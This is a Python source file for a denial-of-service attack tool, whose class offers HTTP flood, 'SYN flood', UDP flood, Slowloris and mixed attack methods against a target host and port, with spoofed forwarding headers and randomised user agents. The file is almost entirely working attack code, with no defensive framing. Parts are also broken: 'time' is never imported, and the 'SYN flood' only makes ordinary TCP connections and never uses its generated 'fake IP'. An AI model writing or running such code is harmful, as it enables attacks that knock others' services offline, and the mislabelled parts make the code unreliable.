#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import random
import requests
import threading
from urllib.parse import urlparse

class Methods:
    def __init__(self, config):
        self.config = config
        self.user_agents = config.get('user_agents', [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ])
        self.timeout = config.get('timeout', 5)
    
    def http_flood(self, target, port):
        """HTTP Flood Attack - Layer 7"""
        try:
            if not target.startswith('http'):
                target = 'http://' + target
            
            url = target + f"?rand={random.randint(1,999999)}"
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            response = requests.get(url, headers=headers, timeout=self.timeout)
            return response.status_code == 200 or response.status_code == 403
            
        except:
            return False
    
    def syn_flood(self, target, port):
        """SYN Flood Attack - Layer 4"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Fake IP
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            try:
                sock.connect((target, port))
                sock.close()
                return True
            except:
                return False
                
        except:
            return False
    
    def udp_flood(self, target, port):
        """UDP Flood Attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Random payload
            payload = random._urandom(1024)
            
            sock.sendto(payload, (target, port))
            sock.close()
            return True
            
        except:
            return False
    
    def slowloris(self, target, port):
        """Slowloris Attack - Keep connections open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            sock.connect((target, port))
            
            # Send partial headers
            sock.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
            sock.send(f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n".encode())
            
            # Keep connection open
            for _ in range(10):
                sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.5)
            
            sock.close()
            return True
            
        except:
            return False
    
    def mixed_attack(self, target, port):
        """Mixed Attack - Combine all methods"""
        methods = ['http', 'syn', 'udp', 'slowloris']
        method = random.choice(methods)
        
        if method == 'http':
            return self.http_flood(target, port)
        elif method == 'syn':
            return self.syn_flood(target, port)
        elif method == 'udp':
            return self.udp_flood(target, port)
        else:
            return self.slowloris(target, port)
